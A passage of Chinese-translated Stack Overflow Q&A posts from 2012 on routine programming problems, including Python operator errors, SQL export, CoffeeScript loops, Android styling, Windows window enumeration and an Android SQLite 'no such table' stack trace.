          w2 = input("Please Enter your weightin lbs:")
          bmi2 = w2/((h*h)*(39.37*39.37)*703) 
          print "Your BMI is:", bmi2

          if bmi2<= 18.5: 
                        print "Your are underweight."
          if bmi2>18.5 & bmi2<24.9: 
                                  print "Your weight is normal."
          if bmi2>25 & bmi2<29.9: 
                                print "Your are overweight"         
          if bmi2>=30: 
                     print "Your are obese" 
```

**输出**

```
Please Enter your height in meters:1.52
Do you want to enter your weight in kg or lbs?kg
Please Enter your weight in kgs:51
Your BMI is 22.074099723
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "bmi.py", line 11, in <module>
    if bmi1 > 18.5 & bmi1 < 24.9: 
TypeError: unsupported operand type(s) for &: 'float' and 'float' 
```

我哪里错了？任何人都只是让我知道..

谢谢 ：）。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-20T12:41:06.783

[`&`](http://docs.python.org/py3k/reference/expressions.html#index-55)是[位运算符](http://wiki.python.org/moin/BitwiseOperators)，我认为您正在寻找布尔值[`and`](http://docs.python.org/py3k/reference/expressions.html#index-65)。

但请注意，Python 也支持以下语法：

```
if 18.5 < bmi1 < 24.9:
    # ... 
```

* * *

由于您似乎对缩进感到困扰，这就是您的脚本的样子：

```
h = raw_input("Please enter your height in meters: ")
h = float(h)
w_unit = raw_input("Do you want to enter your weight in kg or lbs? ")
w = raw_input("Please enter your weight in {}: ".format(w_unit))
w = int(w)
if w_unit == "kg":
    bmi = w / (h*h)
elif w_unit == "lbs":
    bmi = w / ((h*h) * (39.37 * 39.37) * 703)

print "Your BMI is {:.2f}".format(bmi)
if bmi <= 18.5: 
    print "Your are underweight."
elif 18.5 < bmi <= 25: 
    print "Your weight is normal."
elif 25 < bmi < 30: 
    print "Your are overweight"              
elif bmi >= 30:
    print "Your are obese" 
```

有几个小的改进：

*   显式转换（因为在 Python 3 中，`input`函数的行为`raw_input`与 Python 2 不同`input`，所以这样编写输入可能是一个好习惯）
*   真正改变的是`bmi`值，所以没有必要写两次相同的东西。

剩下要做的事情，可能是将整个脚本包装成函数:)

# sql - 使用分隔符从表格传输到记事本

> ID：10246419
> 
> 赞同：1
> 
> 时间：2012-04-20T12:39:43.370
> 
> 标签：sql, sql-server-2008, tsql

目标：
使用“;”在记事本中检索数据 作为列之间的分隔符。记事本中的数据应该是：

```
2001-11-11 00:00:000;1
2001-11-11 00:00:000;2
2001-11-11 00:00:000;0 
```

问题：
我应该如何使用这些数据将数据从表格传输到记事本

```
(datetime)               (int)
date                  Number
--------------------------------
2001-11-11 00:00:000       1
2001-11-11 00:00:000       2
2001-11-11 00:00:000       0
2001-11-11 00:00:000       4 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T12:45:09.690

进入工具选项打开查询结果树，SQL Server，结果到文本。在那里您将看到输出格式，您应该能够选择自定义分隔符，然后您可以将其设置为分号。

如果您现在将输出更改为文本 (ctrl+T) 或将结果更改为文件 (ctrl + shift + F)，您应该会得到您想要的输出。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T12:47:04.783

例如，如果您的数据库是 MySQL，您只需使用以下命令转储数据库：

```
mysqldump --fields-terminated-by=str databasename 
```

其中 str 是“;”。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-20T12:52:11.230

在菜单上选择“results to file”并运行：

```
select CAST(date as varchar(20))+';'+CAST(number as varchar(20))
from yourTable 
```

# android - App Widget 在 HTC One X 上不接收 onEnabled 和 onDisabled 广播

> ID：10246420
> 
> 赞同：3
> 
> 时间：2012-04-20T12:39:44.897
> 
> 标签：android, android-widget

我有一个已在许多不同设备上成功运行的应用小部件。它依赖于 onEnabled 和 onDisabled 方法。最近的测试表明，新的 HTC One X 没有调用这些方法。

由于我的应用小部件的复杂性，我编写了一个非常简单的应用小部件，它只显示静态图像。除此之外，它所做的所有事情都会在调用 onEnabled 和 onDisabled 时输出到日志中。在模拟器和其他设备上进行测试时，它工作正常。但在 HTC One X 上，两种情况都没有观察到输出。

有谁知道这可能的原因？

谢谢。

# sql - 为什么选择计数会获取很多行？

> ID：10246421
> 
> 赞同：0
> 
> 时间：2012-04-20T12:39:46.093
> 
> 标签：sql, indexing

表 team 包含 1169 行，其中 1133 行具有 UserId 字段！=0。“UserId”字段上有一个索引

询问：

`EXPLAIN SELECT count(*) FROM teams WHERE UserId != 0`

返回要检查的行的估计等于 1133 的输出。

为什么查询需要检查所有行？它不应该只为此目的使用索引吗？

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T12:43:49.137

它将检查几乎所有行，因为您想要几乎所有行（因为您说 UserId ！= 0）。当然，然后您进行“计数”，因此您只显示一条记录，但它们都必须被提取才能计算它们。如果你在哪里做

```
select count(1) from teams where UserId = 100 
```

然后它将只检查几行，因为您要求的是精确值（UserId = XX 而不是 UserId ！= yy）。

# coffeescript - 咖啡脚本中的简单循环

> ID：10246422
> 
> 赞同：8
> 
> 时间：2012-04-20T12:39:55.937
> 
> 标签：coffeescript

我有这个代码：

```
count = $content.find('.post').length;              
for x in [1...count]
    /*
    prev_el_height += $("#content .post:nth-child(" + x + ")").height();
    */
    prev_el_height += $content.find(".post:nth-child(" + x + ")").height(); 
```

我希望这会变成

```
for (x = 1; x < count; x++) { prev_el ... } 
```

但它变成了这样：

```
for (x = 1; 1 <= count ? x < count : x > count; 1 <= count ? x++ : x--) { 
```

~~有人可以解释为什么吗？~~

**编辑：如何让我的预期语法输出？**

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-04-20T13:15:00.340

在 CoffeeScript 中，您需要使用`by`关键字来指定循环的步骤。在你的情况下：

```
for x in [1...count] by 1
  ... 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-20T12:42:53.217

您要求从 to 循环`1`，`count`但您假设它`count`总是大于或等于一；生成的代码没有做出这种假设。

因此，如果`count`>= 1，则循环计数器每次都会递增：

```
for (x = 1; x < count; x++) { /* ... */ } 
```

但如果`count`是 < 1 则循环计数器每次递减：

```
for (x = 1; x > count; x--) { /* ... */ } 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-20T12:44:04.037

好吧，你想`x`从 1 到`count`. 该代码正在检查是否`count`大于或小于 1。

如果`count`大于 1，则它必须在*小于*时*递增* 。`x`*`count`*

 *如果`count`小于 1，则它必须在*大于*时*递减* 。`x`*`count`*

 ** * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-21T03:13:42.567

备查：

```
$('#content .post').each ->
    prev_el_height += $(this).height() 
```

具有相同的效果，假设`:nth-child`等于`.eq()`，并且`x`超过元素的数字是一个错字。**

# objective-c - 卸载特定的 UITableViewCells

> ID：10246429
> 
> 赞同：0
> 
> 时间：2012-04-20T12:40:18.467
> 
> 标签：objective-c, ios, uitableview

有没有办法卸载/释放一个`UITableViewCell`这样的 UITableView`cellForRowAtIndexPath:`再次需要它时调用？

我知道这正是`UITableView`默认情况下所做的，但**只有**当单元格位于 tableview 框架之外时。我的自定义视图以`UITableView`它的框架 == 内容大小的方式使用。

如果无法卸载特定单元格，我将不得不考虑不同的方法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T12:55:38.637

该方法`[UITableView reloadRowsAtIndexPaths:withRowAnimation:]`允许您告诉表格视图重新加载一个或多个单元格。如果它们在屏幕上，这将重新加载指定的单元格，如果它们当前不在屏幕上，则可能什么都不做。听起来像你想要的，虽然你的问题对我来说并不完全清楚。

# java - 在 Java 中存储数据。文本文件、csv 还是其他方法？

> ID：10246430
> 
> 赞同：0
> 
> 时间：2012-04-20T12:40:21.170
> 
> 标签：java, performance, memory

我正在创建一个用于从多个 URL 中抓取链接的工具。我想存储这些信息，然后测试抓取的链接的状态。

我预计必须测试很多链接，大约 60,000 个。所以我遇到的问题是决定如何存储要测试的链接。

我正在考虑为要抓取的 URL 创建文本文件。我必须为要抓取的 URL 创建大约 40 个文本文件（我要抓取的 URL 是相同的 URL，只是区域化了）。

*   创建大量文本文件会导致性能问题吗？
*   我最好将 URL 存储在一个数组中，然后将数组写入文本文件，还是我应该只是将 URL 写入文本文件？或者，还有更好的方法？
*   有没有比存储在文本文件中更好的方法？（我真的不想使用数据库，但如果有一个很好的案例，我会被说服）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T12:53:40.183

恕我直言，最简单的方法是使用[序列化](http://java.sun.com/developer/technicalArticles/Programming/serialization/)来保存您的信息。例如，`Map<String, Set<String>>`url 的序列化。多个文件也应该可以工作，不会对性能产生任何严重影响。但实施时间稍长

另一种方法 - 在[mongolab](https://mongolab.com/home)上注册并使用免费帐户。（不是广告，我就是喜欢这个服务）不需要安装任何东西，下载mongo驱动就可以了

# decimal - Magento - 带有 csv 松散小数情况的进口价格

> ID：10246432
> 
> 赞同：1
> 
> 时间：2012-04-20T12:40:26.287
> 
> 标签：decimal

当我将我的 csv 文件导出到 magento 时，他会丢失价格和等级价格的小数位数。

如果价格是 6,55€ 它变成 6...

请帮忙

# android - 将切换按钮背景更改为清除/深灰色

> ID：10246442
> 
> 赞同：0
> 
> 时间：2012-04-20T12:41:08.567
> 
> 标签：android

我在我的应用程序上使用了两个切换按钮，当我在模拟器上运行它时，按钮有黑色文本和浅灰色背景。正如我们在下一张图片中看到的：

![清除切换按钮](../Images/963faf1f0bc23145139d20e460edc258.png)

当我在我的真实设备上运行它时，按钮有另一种风格，它有白色文本和黑色背景。如下图所示。

![深色切换按钮](../Images/789dab7b44fa093b1068032dfddde0e0.png)

我的问题是：如何将 ToggleButton 的样式更改为始终保持清晰的灰色背景，如第一张图片所示？它是由主题定义的吗？

用于按钮的 xml 代码是：

```
<ToggleButton
    android:id="@+id/toggleButtonSimulado"
    android:layout_gravity="center|top"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:textOn="On"
    android:textOff="Off" /> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T14:07:58.397

您可以为按钮使用自己的背景。在您的 sdk 安装目录 (android-sdk-mac_86/platforms/android-9/data/res/drawable-hdpi) 上搜索 btn_toggle_off.9.png/btn_toggle_on.9。并确保复制位于可绘制文件夹上的选择器

或者您可以尝试：

[androiddrawables](http://androiddrawables.com/)

[androiddrawablesexplorer](http://androiddrawableexplorer.appspot.com/)

希望这有帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T13:38:57.097

根据在该设备上选择的当前主题，实际设备中的按钮或任何其他视图的样式会发生变化。为了防止这种情况，您需要明确指定背景颜色和文本颜色。使用渐变作为按钮的背景。例如：

```
<ToggleButton
    android:id="@+id/toggleButtonSimulado"
    android:layout_gravity="center"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:background="@drawable/gray_gradient"
    android:textOn="On"
    android:textOff="Off"
    android:textColor="@android:color/black" /> 
```

# c - 有什么理由使用锁文件而不是羊群？

> ID：10246443
> 
> 赞同：0
> 
> 时间：2012-04-20T12:41:12.760
> 
> 标签：c, unix, file-locking

对于锁定文件，我的意思是：创建一个文件来锁定资源并在再次释放它时将其删除。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-20T12:45:25.697

直接从手册页：

```
NOTES
    flock() does not lock files over NFS.  Use fcntl(2) instead: that does work over NFS, given
    a sufficiently  recent version of Linux and a server which supports locking. 
```

不过，我并不是说使用锁定文件是比 NFS 更好的选择。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T12:48:20.957

不使用flock()的一些原因：

它不适用于 NFS。

它只是一个建议锁，即使您使用锁也不能保证其他进程会尊重它。

# c++ - 如何让 EnumWindows 列出所有窗口？

> ID：10246444
> 
> 赞同：12
> 
> 时间：2012-04-20T12:41:14.350
> 
> 标签：c++, windows, winapi

我假设，我所要求的实际上应该是默认值，但我遇到了一些我不理解的行为。

```
#include "stdafx.h"

using namespace std;

BOOL CALLBACK enumWindowsProc(
  __in  HWND hWnd,
  __in  LPARAM lParam
) {
  if( !::IsIconic( hWnd ) ) {
    return TRUE;
  }

  int length = ::GetWindowTextLength( hWnd );
  if( 0 == length ) return TRUE;

  TCHAR* buffer;
  buffer = new TCHAR[ length + 1 ];
  memset( buffer, 0, ( length + 1 ) * sizeof( TCHAR ) );

  GetWindowText( hWnd, buffer, length + 1 );
  tstring windowTitle = tstring( buffer );
  delete[] buffer;

  wcout << hWnd << TEXT( ": " ) << windowTitle << std::endl;

  return TRUE;
}

int _tmain( int argc, _TCHAR* argv[] ) {
  wcout << TEXT( "Enumerating Windows..." ) << endl;
  BOOL enumeratingWindowsSucceeded = ::EnumWindows( enumWindowsProc, NULL );
  cin.get();
  return 0;
} 
```

如果我调用该代码，它将列出所有最小化的窗口： ![在此处输入图像描述](../Images/4f48f9a3be33e711a99c09b962b7c82e.png)

现在，我不再只对最小化的窗口感兴趣，现在我想要所有这些。所以我删除了`IsIconic`检查：

```
BOOL CALLBACK enumWindowsProc(
  __in  HWND hWnd,
  __in  LPARAM lParam
) {
  /*
  if( !::IsIconic( hWnd ) ) {
    return TRUE;
  }
  */

  int length = ::GetWindowTextLength( hWnd );
  if( 0 == length ) return TRUE;

  TCHAR* buffer;
  buffer = new TCHAR[ length + 1 ];
  memset( buffer, 0, ( length + 1 ) * sizeof( TCHAR ) );

  GetWindowText( hWnd, buffer, length + 1 );
  tstring windowTitle = tstring( buffer );
  delete[] buffer;

  wcout << hWnd << TEXT( ": " ) << windowTitle << std::endl;

  return TRUE;
} 
```

现在我得到**除了**最小化的窗口之外的所有窗口（这次没有列出之前列出的窗口句柄）： ![在此处输入图像描述](../Images/f6d8c456ce85fbb2a4783210e8c8f296.png)

为了完整起见，这是`stdafx.h`：

```
#pragma once

#include "targetver.h"

#include <iostream>
#include <map>
#include <string>

namespace std {
  #if defined _UNICODE || defined UNICODE
    typedef wstring tstring;
  #else
    typedef string tstring;
  #endif
}

#include <stdio.h>
#include <tchar.h>
#include <Windows.h>
#include <psapi.h> 
```

## 我究竟做错了什么？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-07-01T08:57:29.183

好吧，`wcout.flush()`永远不会起作用，但是`wcout.clear()`至少对我而言，它可以修复您的代码。

```
wcout << hWnd << TEXT( ": " ) << windowTitle << std::endl;
wcout.clear();
return TRUE; 
```

我知道这个问题已经一岁了，但是回答永远不会太晚。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2018-08-07T16:34:32.883

这是一个列出所有打开窗口的回调函数：

```
#include <string>
#include <iostream>
#include <Windows.h>

static BOOL CALLBACK enumWindowCallback(HWND hWnd, LPARAM lparam) {
    int length = GetWindowTextLength(hWnd);
    char* buffer = new char[length + 1];
    GetWindowText(hWnd, buffer, length + 1);
    std::string windowTitle(buffer);

    // List visible windows with a non-empty title
    if (IsWindowVisible(hWnd) && length != 0) {
        std::cout << hWnd << ":  " << windowTitle << std::endl;
    }
    return TRUE;
}

int main() {
    std::cout << "Enmumerating windows..." << std::endl;
    EnumWindows(enumWindowCallback, NULL);
    std::cin.ignore();
    return 0;
} 
```

如果要检查窗口是否最小化，可以使用[`IsIconic()`](https://msdn.microsoft.com/en-us/library/windows/desktop/ms633527.aspx).

也可以看看：

*   微软：[EnumWindows 函数](https://msdn.microsoft.com/en-us/library/windows/desktop/ms633497.aspx)
*   Stack Overflow：[获取 C++ 中所有打开窗口的列表并存储它们](https://stackoverflow.com/a/42589826/3357935)

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-04-20T13:08:09.803

这（正如我所假设的）根本不是问题`EnumWindows`。问题出在输出流上。

在调试时，我注意到`enumWindowsProc`每个窗口都可以正常调用，但是某些迭代根本不会生成输出。

暂时改用 using `_tprintf`，但不明白原代码有什么问题。呼叫`wcout.flush()`也没有理想的效果。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2017-11-22T10:42:13.880

Windows 的文档（不知道它的准确性）说 EnumWindows 只枚举顶级窗口。如果你想枚举子窗口，你需要使用 EnumChildWindows 函数，你必须传递父窗口的句柄

# android - 创建后SQL查询失败

> ID：10246447
> 
> 赞同：0
> 
> 时间：2012-04-20T12:41:16.267
> 
> 标签：android

我有一个包含所有数据库变量的文件，其中包括以下行：

```
public static final String TABLE_CONFERENCES = "conferences"; 
```

我的 SQLiteOpenHelper 创建数据库并测试一切是否正常。之后，我确保创建了表。

```
db.beginTransaction();
...
db.execSQL(DatabaseConstants.CREATE_TABLE_CONFERENCES);
...
db.endTransaction();

Log.d(TAG, "testing successful create execution");
db.execSQL("SELECT * FROM " + DatabaseConstants.TABLE_CONFERENCES);
Log.d(TAG, "executed create statements successfully"); 
```

我正在用一些测试数据填充表格并记录结果以确保没有发生错误。

```
 values = new ContentValues();

    cal.set(2020, 1, 1, 12, 30, 0);
    values.put(DatabaseConstants.CONFERENCE_START, cal.getTimeInMillis());
    cal.set(2021, 6, 6, 13, 30, 0);
    values.put(DatabaseConstants.CONFERENCE_END, cal.getTimeInMillis());
    values.put(DatabaseConstants.CONFERENCE_CREATOR, lastInsertId);

    conferenceID = lastInsertId = db.insert(DatabaseConstants.TABLE_CONFERENCES, null, values);

    Log.d(TAG, "inserted ConferenceId: " + Long.toString(lastInsertId));

    cursor = db.query(
                DatabaseConstants.TABLE_CONFERENCES,
                new String[] { DatabaseConstants.CONFERENCE_ID },
                DatabaseConstants.CONFERENCE_ID + "=" + lastInsertId, 
                null, 
                null, 
                null, 
                null,
                null);

    Log.d(TAG, "inserted Conference successfully");

    cursor.moveToFirst();

    Log.d(TAG,
            "Conference has " + DatabaseConstants.PARTICIPANT_ID + ": " + 
            Long.toString(cursor.getLong(cursor.getColumnIndex(DatabaseConstants.CONFERENCE_ID))));

    cursor.close(); 
```

我为我的会议编写了一个数据源，其中包含以下方法：

```
public Conference getConference(long conferenceId) {
    Log.d(TAG, "getConference with conferenceId " + conferenceId + " called");

    /*
     * query(table, columns, selection, selectionArgs, groupBy, having, orderBy)
     */
    Cursor cursor = database.query(
            DatabaseConstants.TABLE_CONFERENCES,
            fields, 
            DatabaseConstants.CONFERENCE_ID + "=" + conferenceId, 
            null, 
            null, 
            null, 
            null);

    cursor.moveToFirst();

    Conference conference = cursorToConference(cursor);

    cursor.close();

    return conference;
} 
```

但是如果我调用上面的方法。我收到以下错误：

```
04-20 14:39:28.669: D/ConferenceDataSource(1300): getConference with conferenceId 1 called
04-20 14:39:28.669: I/SqliteDatabaseCpp(1300): sqlite returned: error code = 1, msg = no such table: conferences, db=/data/data/com.tsystems.openconf/databases/OpenConf_App.Prototype.1.5
04-20 14:39:28.729: D/AndroidRuntime(1300): Shutting down VM
04-20 14:39:28.729: W/dalvikvm(1300): threadid=1: thread exiting with uncaught exception (group=0x409c01f8)
04-20 14:39:28.879: E/AndroidRuntime(1300): FATAL EXCEPTION: main
04-20 14:39:28.879: E/AndroidRuntime(1300): java.lang.RuntimeException: Unable to start activity ComponentInfo{com.tsystems.openconf/com.tsystems.openconf.dashboard.item.ConferenceTableActivity}: java.lang.RuntimeException: Unable to start activity ComponentInfo{com.tsystems.openconf/com.tsystems.openconf.tab.ConferenceInfoActivity}: android.database.sqlite.SQLiteException: no such table: conferences: , while compiling: SELECT _id, startTime, endTime, creator FROM conferences WHERE _id=1
04-20 14:39:28.879: E/AndroidRuntime(1300):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1956)
04-20 14:39:28.879: E/AndroidRuntime(1300):     at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1981)
04-20 14:39:28.879: E/AndroidRuntime(1300):     at android.app.ActivityThread.access$600(ActivityThread.java:123)
04-20 14:39:28.879: E/AndroidRuntime(1300):     at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1147)
04-20 14:39:28.879: E/AndroidRuntime(1300):     at android.os.Handler.dispatchMessage(Handler.java:99)
04-20 14:39:28.879: E/AndroidRuntime(1300):     at android.os.Looper.loop(Looper.java:137)
04-20 14:39:28.879: E/AndroidRuntime(1300):     at android.app.ActivityThread.main(ActivityThread.java:4424)
04-20 14:39:28.879: E/AndroidRuntime(1300):     at java.lang.reflect.Method.invokeNative(Native Method)
04-20 14:39:28.879: E/AndroidRuntime(1300):     at java.lang.reflect.Method.invoke(Method.java:511)
04-20 14:39:28.879: E/AndroidRuntime(1300):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)
04-20 14:39:28.879: E/AndroidRuntime(1300):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551)
04-20 14:39:28.879: E/AndroidRuntime(1300):     at dalvik.system.NativeStart.main(Native Method)
04-20 14:39:28.879: E/AndroidRuntime(1300): Caused by: java.lang.RuntimeException: Unable to start activity ComponentInfo{com.tsystems.openconf/com.tsystems.openconf.tab.ConferenceInfoActivity}: android.database.sqlite.SQLiteException: no such table: conferences: , while compiling: SELECT _id, startTime, endTime, creator FROM conferences WHERE _id=1
04-20 14:39:28.879: E/AndroidRuntime(1300):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1956)
04-20 14:39:28.879: E/AndroidRuntime(1300):     at android.app.ActivityThread.startActivityNow(ActivityThread.java:1797)
04-20 14:39:28.879: E/AndroidRuntime(1300):     at android.app.LocalActivityManager.moveToState(LocalActivityManager.java:135)
04-20 14:39:28.879: E/AndroidRuntime(1300):     at android.app.LocalActivityManager.startActivity(LocalActivityManager.java:347)
04-20 14:39:28.879: E/AndroidRuntime(1300):     at android.widget.TabHost$IntentContentStrategy.getContentView(TabHost.java:682)
04-20 14:39:28.879: E/AndroidRuntime(1300):     at android.widget.TabHost.setCurrentTab(TabHost.java:346)
04-20 14:39:28.879: E/AndroidRuntime(1300):     at android.widget.TabHost.addTab(TabHost.java:236)
04-20 14:39:28.879: E/AndroidRuntime(1300):     at com.tsystems.openconf.dashboard.item.ConferenceTableActivity.onCreate(ConferenceTableActivity.java:55)
04-20 14:39:28.879: E/AndroidRuntime(1300):     at android.app.Activity.performCreate(Activity.java:4465)
04-20 14:39:28.879: E/AndroidRuntime(1300):     at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1049)
04-20 14:39:28.879: E/AndroidRuntime(1300):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1920)
04-20 14:39:28.879: E/AndroidRuntime(1300):     ... 11 more
04-20 14:39:28.879: E/AndroidRuntime(1300): Caused by: android.database.sqlite.SQLiteException: no such table: conferences: , while compiling: SELECT _id, startTime, endTime, creator FROM conferences WHERE _id=1
04-20 14:39:28.879: E/AndroidRuntime(1300):     at android.database.sqlite.SQLiteCompiledSql.native_compile(Native Method)
04-20 14:39:28.879: E/AndroidRuntime(1300):     at android.database.sqlite.SQLiteCompiledSql.<init>(SQLiteCompiledSql.java:68)
04-20 14:39:28.879: E/AndroidRuntime(1300):     at android.database.sqlite.SQLiteProgram.compileSql(SQLiteProgram.java:143)
04-20 14:39:28.879: E/AndroidRuntime(1300):     at android.database.sqlite.SQLiteProgram.compileAndbindAllArgs(SQLiteProgram.java:361)
04-20 14:39:28.879: E/AndroidRuntime(1300):     at android.database.sqlite.SQLiteProgram.<init>(SQLiteProgram.java:127)
04-20 14:39:28.879: E/AndroidRuntime(1300):     at android.database.sqlite.SQLiteProgram.<init>(SQLiteProgram.java:94)
04-20 14:39:28.879: E/AndroidRuntime(1300):     at android.database.sqlite.SQLiteQuery.<init>(SQLiteQuery.java:53)
04-20 14:39:28.879: E/AndroidRuntime(1300):     at android.database.sqlite.SQLiteDirectCursorDriver.query(SQLiteDirectCursorDriver.java:47)
04-20 14:39:28.879: E/AndroidRuntime(1300):     at android.database.sqlite.SQLiteDatabase.rawQueryWithFactory(SQLiteDatabase.java:1564)
04-20 14:39:28.879: E/AndroidRuntime(1300):     at android.database.sqlite.SQLiteDatabase.queryWithFactory(SQLiteDatabase.java:1449)
04-20 14:39:28.879: E/AndroidRuntime(1300):     at android.database.sqlite.SQLiteDatabase.query(SQLiteDatabase.java:1405)
04-20 14:39:28.879: E/AndroidRuntime(1300):     at android.database.sqlite.SQLiteDatabase.query(SQLiteDatabase.java:1485)
04-20 14:39:28.879: E/AndroidRuntime(1300):     at com.tsystems.openconf.database.dataSource.ConferenceDataSource.getConference(ConferenceDataSource.java:100)
04-20 14:39:28.879: E/AndroidRuntime(1300):     at com.tsystems.openconf.tab.ConferenceInfoActivity.onCreate(ConferenceInfoActivity.java:34)
04-20 14:39:28.879: E/AndroidRuntime(1300):     at android.app.Activity.performCreate(Activity.java:4465)
04-20 14:39:28.879: E/AndroidRuntime(1300):     at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1049)
04-20 14:39:28.879: E/AndroidRuntime(1300):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1920)
04-20 14:39:28.879: E/AndroidRuntime(1300):     ... 21 more
04-20 14:39:28.988: D/dalvikvm(1300): GC_CONCURRENT freed 215K, 3% free 9321K/9607K, paused 8ms+9ms
04-20 14:39:29.109: E/SQLiteDatabase(1300): close() was never explicitly called on database '/data/data/com.tsystems.openconf/databases/OpenConf_App.Prototype.1.5' 
04-20 14:39:29.109: E/SQLiteDatabase(1300): android.database.sqlite.DatabaseObjectNotClosedException: Application did not close the cursor or database object that was opened here
04-20 14:39:29.109: E/SQLiteDatabase(1300):     at android.database.sqlite.SQLiteDatabase.<init>(SQLiteDatabase.java:1943)
04-20 14:39:29.109: E/SQLiteDatabase(1300):     at android.database.sqlite.SQLiteDatabase.openDatabase(SQLiteDatabase.java:1007)
04-20 14:39:29.109: E/SQLiteDatabase(1300):     at android.database.sqlite.SQLiteDatabase.openDatabase(SQLiteDatabase.java:986)
04-20 14:39:29.109: E/SQLiteDatabase(1300):     at android.database.sqlite.SQLiteDatabase.openOrCreateDatabase(SQLiteDatabase.java:1051)
04-20 14:39:29.109: E/SQLiteDatabase(1300):     at android.app.ContextImpl.openOrCreateDatabase(ContextImpl.java:770)
04-20 14:39:29.109: E/SQLiteDatabase(1300):     at android.content.ContextWrapper.openOrCreateDatabase(ContextWrapper.java:221)
04-20 14:39:29.109: E/SQLiteDatabase(1300):     at android.database.sqlite.SQLiteOpenHelper.getWritableDatabase(SQLiteOpenHelper.java:157)
04-20 14:39:29.109: E/SQLiteDatabase(1300):     at com.tsystems.openconf.database.dataSource.ConferenceDataSource.open(ConferenceDataSource.java:41)
04-20 14:39:29.109: E/SQLiteDatabase(1300):     at com.tsystems.openconf.tab.ConferenceInfoActivity.onCreate(ConferenceInfoActivity.java:32)
04-20 14:39:29.109: E/SQLiteDatabase(1300):     at android.app.Activity.performCreate(Activity.java:4465)
04-20 14:39:29.109: E/SQLiteDatabase(1300):     at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1049)
04-20 14:39:29.109: E/SQLiteDatabase(1300):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1920)
04-20 14:39:29.109: E/SQLiteDatabase(1300):     at android.app.ActivityThread.startActivityNow(ActivityThread.java:1797)
04-20 14:39:29.109: E/SQLiteDatabase(1300):     at android.app.LocalActivityManager.moveToState(LocalActivityManager.java:135)
04-20 14:39:29.109: E/SQLiteDatabase(1300):     at android.app.LocalActivityManager.startActivity(LocalActivityManager.java:347)
04-20 14:39:29.109: E/SQLiteDatabase(1300):     at android.widget.TabHost$IntentContentStrategy.getContentView(TabHost.java:682)
04-20 14:39:29.109: E/SQLiteDatabase(1300):     at android.widget.TabHost.setCurrentTab(TabHost.java:346)
04-20 14:39:29.109: E/SQLiteDatabase(1300):     at android.widget.TabHost.addTab(TabHost.java:236)
04-20 14:39:29.109: E/SQLiteDatabase(1300):     at com.tsystems.openconf.dashboard.item.ConferenceTableActivity.onCreate(ConferenceTableActivity.java:55)
04-20 14:39:29.109: E/SQLiteDatabase(1300):     at android.app.Activity.performCreate(Activity.java:4465)
04-20 14:39:29.109: E/SQLiteDatabase(1300):     at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1049)
04-20 14:39:29.109: E/SQLiteDatabase(1300):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1920)
04-20 14:39:29.109: E/SQLiteDatabase(1300):     at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1981)
04-20 14:39:29.109: E/SQLiteDatabase(1300):     at android.app.ActivityThread.access$600(ActivityThread.java:123)
04-20 14:39:29.109: E/SQLiteDatabase(1300):     at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1147)
04-20 14:39:29.109: E/SQLiteDatabase(1300):     at android.os.Handler.dispatchMessage(Handler.java:99)
04-20 14:39:29.109: E/SQLiteDatabase(1300):     at android.os.Looper.loop(Looper.java:137)
04-20 14:39:29.109: E/SQLiteDatabase(1300):     at android.app.ActivityThread.main(ActivityThread.java:4424)
04-20 14:39:29.109: E/SQLiteDatabase(1300):     at java.lang.reflect.Method.invokeNative(Native Method)
04-20 14:39:29.109: E/SQLiteDatabase(1300):     at java.lang.reflect.Method.invoke(Method.java:511)
04-20 14:39:29.109: E/SQLiteDatabase(1300):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)
04-20 14:39:29.109: E/SQLiteDatabase(1300):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551)
04-20 14:39:29.109: E/SQLiteDatabase(1300):     at dalvik.system.NativeStart.main(Native Method)
04-20 14:39:29.109: E/System(1300): Uncaught exception thrown by finalizer
04-20 14:39:29.139: E/System(1300): java.lang.IllegalStateException: Don't have database lock!
04-20 14:39:29.139: E/System(1300):     at android.database.sqlite.SQLiteDatabase.verifyLockOwner(SQLiteDatabase.java:2090)
04-20 14:39:29.139: E/System(1300):     at android.database.sqlite.SQLiteDatabase$1.entryRemoved(SQLiteDatabase.java:2182)
